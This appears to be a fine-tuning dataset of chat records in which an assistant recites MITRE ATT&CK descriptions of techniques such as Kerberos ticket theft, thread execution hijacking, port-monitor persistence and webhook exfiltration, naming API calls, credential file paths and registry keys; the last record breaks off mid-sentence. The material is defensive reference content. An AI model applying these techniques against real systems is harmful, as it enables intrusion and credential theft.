{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Cloud Accounts' and with the Id: T1586.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Cloud Accounts' and with the Id: T1586.003 is described as follows: Adversaries may compromise cloud accounts that can be used during targeting. Adversaries can use compromised cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, Microsoft OneDrive, or AWS S3 buckets for [Exfiltration to Cloud Storage](https://attack.mitre.org/techniques/T1567/002) or to [Upload Tool](https://attack.mitre.org/techniques/T1608/002)s. Cloud accounts can also be used in the acquisition of infrastructure, such as [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003)s or [Serverless](https://attack.mitre.org/techniques/T1583/007) infrastructure. Compromising cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.(Citation: Awake Security C2 Cloud)A variety of methods exist for compromising cloud accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, conducting [Password Spraying](https://attack.mitre.org/techniques/T1110/003) attacks, or attempting to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.(Citation: MSTIC Nobelium Oct 2021) Prior to compromising cloud accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. In some cases, adversaries may target privileged service provider accounts with the intent of leveraging a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) between service providers and their customers.(Citation: MSTIC Nobelium Oct 2021). The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Email Accounts' and with the Id: T1586.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Email Accounts' and with the Id: T1586.002 is described as follows: Adversaries may compromise email accounts that can be used during targeting. Adversaries can use compromised email accounts to further their operations, such as leveraging them to conduct [Phishing for Information](https://attack.mitre.org/techniques/T1598), [Phishing](https://attack.mitre.org/techniques/T1566), or large-scale spam email campaigns. Utilizing an existing persona with a compromised email account may engender a level of trust in a potential victim if they have a relationship with, or knowledge of, the compromised persona. Compromised email accounts can also be used in the acquisition of infrastructure (ex: [Domains](https://attack.mitre.org/techniques/T1583/001)).A variety of methods exist for compromising email accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials.(Citation: AnonHBGary)(Citation: Microsoft DEV-0537) Prior to compromising email accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. Adversaries may target compromising well-known email accounts or domains from which malicious spam or [Phishing](https://attack.mitre.org/techniques/T1566) emails may evade reputation-based email filtering rules.Adversaries can use a compromised email account to hijack existing email threads with targets of interest.. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Upload Malware' and with the Id: T1608.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Upload Malware' and with the Id: T1608.001 is described as follows: Adversaries may upload malware to third-party or adversary controlled infrastructure to make it accessible during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, and a variety of other malicious content. Adversaries may upload malware to support their operations, such as making a payload available to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) by placing it on an Internet accessible web server.Malware may be placed on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)). Malware can also be staged on web services, such as GitHub or Pastebin, or hosted on the InterPlanetary File System (IPFS), where decentralized content storage makes the removal of malicious files difficult.(Citation: Volexity Ocean Lotus November 2020)(Citation: Talos IPFS 2022)Adversaries may upload backdoored files, such as application binaries, virtual machine images, or container images, to third-party software stores or repositories (ex: GitHub, CNET, AWS Community AMIs, Docker Hub). By chance encounter, victims may directly download/install these backdoored files via [User Execution](https://attack.mitre.org/techniques/T1204). [Masquerading](https://attack.mitre.org/techniques/T1036) may increase the chance of users mistakenly executing these files.. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Supply Chain Compromise' and with the Id: T1195 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Supply Chain Compromise' and with the Id: T1195 is described as follows: Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.Supply chain compromise can take place at any stage of the supply chain including:* Manipulation of development tools* Manipulation of a development environment* Manipulation of source code repositories (public or private)* Manipulation of source code in open-source dependencies* Manipulation of software update/distribution mechanisms* Compromised/infected system images (multiple cases of removable media infected at the factory)(Citation: IBM Storwize)(Citation: Schneider Electric USB Malware) * Replacement of legitimate software with modified versions* Sales of modified/counterfeit products to legitimate distributors* Shipment interdictionWhile supply chain compromise can impact any component of hardware or software, adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels.(Citation: Avast CCleaner3 2018)(Citation: Microsoft Dofoil 2018)(Citation: Command Five SK 2011) Targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Symantec Elderwood Sept 2012)(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011) Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise). The systems targeted by this attack pattern are: Linux, Windows, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exploit Public-Facing Application' and with the Id: T1190 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exploit Public-Facing Application' and with the Id: T1190 is described as follows: Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.Exploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).If an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.Adversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)For websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25). The systems targeted by this attack pattern are: Windows, IaaS, Network, Linux, macOS, Containers ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Steal or Forge Kerberos Tickets' and with the Id: T1558 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Steal or Forge Kerberos Tickets' and with the Id: T1558 is described as follows: Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as \u201crealms\u201d, there are three basic participants: client, service, and Key Distribution Center (KDC).(Citation: ADSecurity Kerberos Ring Decoder) Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Adversaries may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.On Windows, the built-in <code>klist</code> utility can be used to list and analyze cached Kerberos tickets.(Citation: Microsoft Klist)Linux systems on Active Directory domains store Kerberos credentials locally in the credential cache file referred to as the \"ccache\". The credentials are stored in the ccache file while they remain valid and generally while a user's session lasts.(Citation: MIT ccache) On modern Redhat Enterprise Linux systems, and derivative distributions, the System Security Services Daemon (SSSD) handles Kerberos tickets. By default SSSD maintains a copy of the ticket database that can be found in <code>/var/lib/sss/secrets/secrets.ldb</code> as well as the corresponding key located in <code>/var/lib/sss/secrets/.secrets.mkey</code>. Both files require root access to read. If an adversary is able to access the database and key, the credential cache Kerberos blob can be extracted and converted into a usable Kerberos ccache file that adversaries may use for [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). The ccache file may also be converted into a Windows format using tools such as Kekeo.(Citation: Linux Kerberos Tickets)(Citation: Brining MimiKatz to Unix)(Citation: Kekeo)Kerberos tickets on macOS are stored in a standard ccache format, similar to Linux. By default, access to these ccache entries is federated through the KCM daemon process via the Mach RPC protocol, which uses the caller's environment to determine access. The storage location for these ccache entries is influenced by the <code>/etc/krb5.conf</code> configuration file and the <code>KRB5CCNAME</code> environment variable which can specify to save them to disk or keep them protected via the KCM daemon. Users can interact with ticket storage using <code>kinit</code>, <code>klist</code>, <code>ktutil</code>, and <code>kcc</code> built-in binaries or via Apple's native Kerberos framework. Adversaries can use open source tools to interact with the ccache files directly or to use the Kerberos framework to call lower-level APIs for extracting the user's TGT or Service Tickets.(Citation: SpectorOps Bifrost Kerberos macOS 2019)(Citation: macOS kerberos framework MIT). The systems targeted by this attack pattern are: Windows, Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Credentials from Password Stores' and with the Id: T1555 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Credentials from Password Stores' and with the Id: T1555 is described as follows: Adversaries may search for common password storage locations to obtain user credentials.(Citation: F-Secure The Dukes) Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications and services that store passwords to make them easier for users to manage and maintain, such as password managers and cloud secrets vaults. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.. The systems targeted by this attack pattern are: Linux, macOS, Windows, IaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exfiltration Over Web Service' and with the Id: T1567 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exfiltration Over Web Service' and with the Id: T1567 is described as follows: Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.Web service providers also commonly use SSL/TLS encryption, giving adversaries an added level of protection.. The systems targeted by this attack pattern are: Linux, macOS, Windows, Office 365, SaaS, Google Workspace ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Remote Access Software' and with the Id: T1219 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Remote Access Software' and with the Id: T1219 is described as follows: An adversary may use legitimate desktop support and remote access software to establish an interactive command and control channel to target systems within networks. These services, such as `VNC`, `Team Viewer`, `AnyDesk`, `ScreenConnect`, `LogMein`, `AmmyyAdmin`, and other remote monitoring and management (RMM) tools, are commonly used as legitimate technical support software and may be allowed by application control within a target environment.(Citation: Symantec Living off the Land)(Citation: CrowdStrike 2015 Global Threat Report)(Citation: CrySyS Blog TeamSpy)Remote access software may be installed and used post-compromise as an alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary-controlled system. Adversaries may similarly abuse response features included in EDR and other defensive tools that enable remote access.Installation of many remote access software may also include persistence (e.g., the software's installation routine creates a [Windows Service](https://attack.mitre.org/techniques/T1543/003)). Remote access modules/features may also exist as part of otherwise existing software (e.g., Google Chrome\u2019s Remote Desktop).(Citation: Google Chrome Remote Desktop)(Citation: Chrome Remote Desktop). The systems targeted by this attack pattern are: Linux, Windows, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Domains' and with the Id: T1583.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Domains' and with the Id: T1583.001 is described as follows: Adversaries may acquire domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free.Adversaries may use acquired domains for a variety of purposes, including for [Phishing](https://attack.mitre.org/techniques/T1566), [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), and Command and Control.(Citation: CISA MSS Sep 2020) Adversaries may choose domains that are similar to legitimate domains, including through use of homoglyphs or use of a different top-level domain (TLD).(Citation: FireEye APT28)(Citation: PaypalScam) Typosquatting may be used to aid in delivery of payloads via [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). Adversaries may also use internationalized domain names (IDNs) and different character sets (e.g. Cyrillic, Greek, etc.) to execute \"IDN homograph attacks,\" creating visually similar lookalike domains used to deliver malware to victim machines.(Citation: CISA IDN ST05-016)(Citation: tt_httrack_fake_domains)(Citation: tt_obliqueRAT)(Citation: httrack_unhcr)(Citation: lazgroup_idn_phishing)Different URIs/URLs may also be dynamically generated to uniquely serve malicious content to victims (including one-time, single use domain names).(Citation: iOS URL Scheme)(Citation: URI)(Citation: URI Use)(Citation: URI Unique)Adversaries may also acquire and repurpose expired domains, which may be potentially already allowlisted/trusted by defenders based on an existing reputation/history.(Citation: Categorisation_not_boundary)(Citation: Domain_Steal_CC)(Citation: Redirectors_Domain_Fronting)(Citation: bypass_webproxy_filtering)Domain registrars each maintain a publicly viewable database that displays contact information for every registered domain. Private WHOIS services display alternative information, such as their own company data, rather than the owner of the domain. Adversaries may use such private WHOIS services to obscure information about who owns a purchased domain. Adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars.(Citation: Mandiant APT1). The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Archive via Library' and with the Id: T1560.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Archive via Library' and with the Id: T1560.002 is described as follows: An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including [Python](https://attack.mitre.org/techniques/T1059/006) rarfile (Citation: PyPI RAR), libzip (Citation: libzip), and zlib (Citation: Zlib Github). Most libraries include functionality to encrypt and/or compress data.Some archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the libraries are different from the utilities. The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Thread Execution Hijacking' and with the Id: T1055.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Thread Execution Hijacking' and with the Id: T1055.003 is described as follows: Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process. Thread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point the process can be suspended then written to, realigned to the injected code, and resumed via <code>SuspendThread </code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.(Citation: Elastic Process Injection July 2017)This is very similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) but targets an existing process rather than creating a process in a suspended state.  Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process. . The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Multilayer Encryption' and with the Id: T1079 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Multilayer Encryption' and with the Id: T1079 is described as follows: An adversary performs C2 communications using multiple layers of encryption, typically (but not exclusively) tunneling a custom encryption scheme within a protocol encryption scheme such as HTTPS or SMTPS.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Masquerading' and with the Id: T1036 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Masquerading' and with the Id: T1036 is described as follows: Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.Renaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site). The systems targeted by this attack pattern are: Linux, macOS, Windows, Containers ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Application Shimming' and with the Id: T1546.011 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Application Shimming' and with the Id: T1546.011 is described as follows: Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. (Citation: Elastic Process Injection July 2017)Within the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS. A list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:* <code>%WINDIR%\\AppPatch\\sysmain.sdb</code> and* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdb</code>Custom databases are stored in:* <code>%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Custom</code> and* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom</code>To keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).Utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc. (Citation: FireEye Application Shimming) Shims can also be abused to establish persistence by continuously being invoked by affected programs.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Unsecured Credentials' and with the Id: T1552 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Unsecured Credentials' and with the Id: T1552 is described as follows: Adversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. [Bash History](https://attack.mitre.org/techniques/T1552/003)), operating system or application-specific repositories (e.g. [Credentials in Registry](https://attack.mitre.org/techniques/T1552/002)),  or other specialized files/artifacts (e.g. [Private Keys](https://attack.mitre.org/techniques/T1552/004)).(Citation: Brining MimiKatz to Unix). The systems targeted by this attack pattern are: Windows, Azure AD, Office 365, SaaS, IaaS, Linux, macOS, Google Workspace, Containers, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Port Monitors' and with the Id: T1547.010 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Port Monitors' and with the Id: T1547.010 is described as follows: Adversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the <code>AddMonitor</code> API call to set a DLL to be loaded at startup.(Citation: AddMonitor) This DLL can be located in <code>C:\\Windows\\System32</code> and will be loaded and run by the print spooler service, `spoolsv.exe`, under SYSTEM level permissions on boot.(Citation: Bloxham) Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to the `Driver` value of an existing or new arbitrarily named subkey of <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors</code>. The Registry key contains entries for the following:* Local Port* Standard TCP/IP Port* USB Monitor* WSD Port. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Clear Mailbox Data' and with the Id: T1070.008 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Clear Mailbox Data' and with the Id: T1070.008 is described as follows: Adversaries may modify mail and mail application data to remove evidence of their activity. Email applications allow users and other programs to export and delete mailbox data via command line tools or use of APIs. Mail application data can be emails, email metadata, or logs generated by the application or operating system, such as export requests. Adversaries may manipulate emails and mailbox data to remove logs, artifacts, and metadata, such as evidence of [Phishing](https://attack.mitre.org/techniques/T1566)/[Internal Spearphishing](https://attack.mitre.org/techniques/T1534), [Email Collection](https://attack.mitre.org/techniques/T1114), [Mail Protocols](https://attack.mitre.org/techniques/T1071/003) for command and control, or email-based exfiltration such as [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048). For example, to remove evidence on Exchange servers adversaries have used the <code>ExchangePowerShell</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) module, including <code>Remove-MailboxExportRequest</code> to remove evidence of mailbox exports.(Citation: Volexity SolarWinds)(Citation: ExchangePowerShell Module) On Linux and macOS, adversaries may also delete emails through a command line utility called <code>mail</code>  or use [AppleScript](https://attack.mitre.org/techniques/T1059/002) to interact with APIs on macOS.(Citation: Cybereason Cobalt Kitty 2017)(Citation: mailx man page)Adversaries may also remove emails and metadata/headers indicative of spam or suspicious activity (for example, through the use of organization-wide transport rules) to reduce the likelihood of malicious emails being detected by security products.(Citation: Microsoft OAuth Spam 2022). The systems targeted by this attack pattern are: Linux, macOS, Windows, Office 365, Google Workspace ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Login Hook' and with the Id: T1037.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Login Hook' and with the Id: T1037.002 is described as follows: Adversaries may use a Login Hook to establish persistence executed upon user logon. A login hook is a plist file that points to a specific script to execute with root privileges upon user logon. The plist file is located in the <code>/Library/Preferences/com.apple.loginwindow.plist</code> file and can be modified using the <code>defaults</code> command-line utility. This behavior is the same for logout hooks where a script can be executed upon user logout. All hooks require administrator permissions to modify or create hooks.(Citation: Login Scripts Apple Dev)(Citation: LoginWindowScripts Apple Dev) Adversaries can add or insert a path to a malicious script in the <code>com.apple.loginwindow.plist</code> file, using the <code>LoginHook</code> or <code>LogoutHook</code> key-value pair. The malicious script is executed upon the next user login. If a login hook already exists, adversaries can add additional commands to an existing login hook. There can be only one login and logout hook on a system at a time.(Citation: S1 macOs Persistence)(Citation: Wardle Persistence Chapter)**Note:** Login hooks were deprecated in 10.11 version of macOS in favor of [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) and [Launch Agent](https://attack.mitre.org/techniques/T1543/001) . The systems targeted by this attack pattern are: macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Content Injection' and with the Id: T1659 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Content Injection' and with the Id: T1659 is described as follows: Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)Adversaries may inject content to victim systems in various ways, including:* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM)* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)Content injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Process Injection' and with the Id: T1055 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Process Injection' and with the Id: T1055 is described as follows: Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. . The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exfiltration Over Webhook' and with the Id: T1567.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exfiltration Over Webhook' and with the Id: T1567.004 is described as follows: Adversaries may exfiltrate data to a webhook endpoint rather than over their primary command and control channel. Webhooks are simple mechanisms for allowing a server to push data over HTTP/S to a client without the need for the client to continuously poll the server.(Citation: RedHat Webhooks) Many public and commercial services, such as Discord, Slack, and `webhook.site`, support the creation of webhook endpoints that can be used by other services, such as Github, Jira, or Trello.(Citation: Discord Intro to Webhooks) When changes happen in the linked services (such as pushing a repository update or modifying a ticket), these services will automatically post the data to the webhook endpoint for use by the consuming application. Adversaries may link an adversary-owned environment to a victim-owned SaaS service to achieve repeated [Automated Exfiltration](https://attack.mitre.org/techniques/T1020) of emails, chat messages, and other data.(Citation: Push Security SaaS Attacks Repository Webhooks) Alternatively, instead of linking the webhook endpoint to a service, an adversary can manually post staged data directly to the URL in order to exfiltrate it.(Citation: Microsoft SQL Server)Access to webhook endpoints is often over HTTPS, which gives the adversary an additional level of protection. Exfiltration leveraging webhooks can also blend in with normal network traffic if the webhook endpoint points to a commonly used SaaS application or collaboration service.(Citation: CyberArk Labs Discord)(Citation: Talos Discord Webhook Abuse)(Citation: Checkmarx Webhooks). The systems targeted by this attack pattern are: Windows, macOS, Linux, SaaS, Office 365, Google Workspace ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Bash History' and with the Id: T1139 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Bash History' and with the Id: T1139 is described as follows: Bash keeps track of the commands users type on the command-line with the \"history\" utility. Once a user logs out, the history is flushed to the user\u2019s <code>.bash_history</code> file. For each user, this file resides at the same location: <code>~/.bash_history</code>. Typically, this file keeps track of the user\u2019s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Attackers can abuse this by looking through the file for potential credentials. (Citation: External to DA, the OS X Way). The systems targeted by this attack pattern are: Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Traffic Signaling' and with the Id: T1205 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Traffic Signaling' and with the Id: T1205 is described as follows: Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. [Port Knocking](https://attack.mitre.org/techniques/T1205/001)), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.Adversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if 